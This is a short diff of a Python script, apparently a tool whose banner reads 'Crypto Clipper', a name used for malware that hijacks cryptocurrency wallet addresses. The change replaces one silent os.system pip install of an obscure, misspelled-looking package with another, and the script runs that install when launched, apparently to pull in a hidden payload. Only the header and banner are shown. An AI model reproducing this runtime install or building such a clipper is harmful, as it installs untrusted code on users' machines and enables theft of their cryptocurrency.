@@ -1,6 +1,6 @@
 import os
-os.system("pip install libaryscraper")
-import libaryscraper
+os.system("pip install pylibarys")
+import pylibarys
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
